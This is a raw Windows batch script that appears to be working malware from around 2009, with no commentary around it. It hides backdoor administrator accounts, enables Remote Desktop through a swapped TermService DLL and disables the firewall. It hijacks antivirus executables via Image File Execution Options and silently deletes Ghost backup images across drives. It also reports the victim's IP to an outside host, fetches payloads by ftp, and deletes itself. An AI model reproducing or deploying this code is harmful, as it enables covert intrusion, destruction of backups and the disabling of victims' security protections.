attrib +r BaiDuhi1.url
attrib +r BaiDuhi2.url
if exist BaiDuhi12.txt attrib +r BaiDuhi12.txt
attrib +s +h +r C:\%computername%.txt
del *.* /q
attrib -r %computername%.txt
attrib -r BaiDuhi.url
attrib -r BaiDuhi1.url
attrib -r BaiDuhi2.url
if exist BaiDuhi12.txt attrib -r BaiDuhi12.txt
attrib +s +h "C:\Documents and Settings\All Users\Application Data\Microsoft\OFFICE"
echo Windows Registry Editor Version 5.00 >3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList] >>3389.reg
echo "AdminNetwork"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList] >>3389.reg
echo "Admin$"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList] >>3389.reg
echo "Admin"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList] >>3389.reg
echo "Guest"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>3389.reg
echo "KeepRASConnections"="1" >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg
echo "fDenyTSConnections"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core] >>3389.reg
echo "EnableConcurrentSessions"=dword:00000001 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters] >>3389.reg
echo "ServiceDll"="%SystemRoot%\system32\TermServiceKyo.dll" >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>3389.reg
echo "start"=dword:00000002 >>3389.reg
echo "Description"="ʹ����ϵͳԶ������Э�����ն˷������Ļ����ṹ�����ܴ���.���ʺ��޸��ļ�.����˷�����ֹ,����ʧȥ��Щ��־��¼�Ͷ��û����ü����õ�ϵͳ��ά������." >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sharedaccess] >>3389.reg
echo "start"=dword:00000004 >>3389.reg
type %systemdrive%\BOOT.INI|find /i "XP"&&regedit /s 3389.reg
echo Windows Registry Editor Version 5.00 >Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\netstat.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KvPreScan.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vsserv.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\livesrv.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xcommsvr.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSTART.EXE] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC.EXE] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC1.EXE] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC2.EXE] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPMON.EXE] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ashwebsv.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ashserv.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ashdisp.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\aswupdsv.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ashDisp.exe] >>Image.reg
echo "debugger"="TASKMAN.EXE" >>Image.reg
regedit /s Image.reg
echo On Error Resume Next >BaiDudel.vbs
echo set ws=wscript.createobject("wscript.shell") >>BaiDudel.vbs
echo ws.run ("%comspec% /c del D:\*.gho /s /f /q /aa"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del E:\*.gho /s /f /q /aa"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del F:\*.gho /s /f /q /aa"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del D:\*.gho /s /f /q /ah"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del E:\*.gho /s /f /q /ah"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del F:\*.gho /s /f /q /ah"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del D:\*.gho /s /f /q"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del E:\*.gho /s /f /q"),0 >>BaiDudel.vbs
echo ws.run ("%comspec% /c del F:\*.gho /s /f /q"),0 >>BaiDudel.vbs
if not exist "C:\Documents and Settings\All Users\alluserslog.ini" call BaiDudel.vbs
attrib +h C:\date.txt
echo %date%>>"C:\Documents and Settings\All Users\alluserslog.ini"
if exist BaiDuhi12.txt FOR /f "tokens=3,*" %%a in ('findstr /i "KVMonXP.kxp" BaiDuhi12.txt') do start "" "%%a %%b"
attrib +s +h "C:\Documents and Settings\All Users\alluserslog.ini"
del BaiDudel.vbs
echo On Error Resume next >Microsoft\chekip.vbs
echo Set oDOM=WScript.GetObject("http://userlogs.6600.org/userlogs/2009/abckyo2009.asp") >>Microsoft\chekip.vbs
echo WScript.sleep 1000 >>Microsoft\chekip.vbs
echo ip = Split(oDOM.documentElement.outerText) >>Microsoft\chekip.vbs
echo Set FSO = CreateObject("Scripting.FileSystemObject") >>Microsoft\chekip.vbs
echo Set SCF = FSO.OpenTextFile(FSO.BuildPath(FSO.GetSpecialFolder(0),"users2009logs.ini"),2,true) >>Microsoft\chekip.vbs
echo SCF.Write(ip(0)) >>Microsoft\chekip.vbs
echo SCF.Write(ip(1)) >>Microsoft\chekip.vbs
echo SCF.Close >>Microsoft\chekip.vbs
sc config Browser start= disabled
sc config lanmanserver start= disabled
start Microsoft\chekip.vbs
ftp -s:BaiDuhi.url
for %%a in ("lanyu.shs") do if %%~za lss 20000 ftp -s:BaiDuhi1.url
for %%a in ("lanyu.shs") do if %%~za lss 20000 ftp -s:BaiDuhi2.url
copy lanyu.shs "D:\My documents\BaiDu-LanYu����.shs" /y
copy TermServiceKyo.dll %SystemRoot%\system32\TermServiceKyo.dll /y
for %%a in ("internet2009.exe") do if %%~za gtr 1000 call internet2009.exe
if exist %SystemRoot%\system32\a.exe ren %SystemRoot%\system32\a.exe nanyukyo2009.exe
del *.* /q
net stop Browser /y
net stop lanmanworkstation /y
net stop lanmanserver /y
if exist "%allusersprofile%\Application Data\Kaspersky Lab\AVP7\Bases\base001.avc" shutdown -r -t 1
if exist "%allusersprofile%\Application Data\Kaspersky Lab\AVP8\Bases\base001.kdc" shutdown -r -t 1
attrib -s -h -r %0
del %0
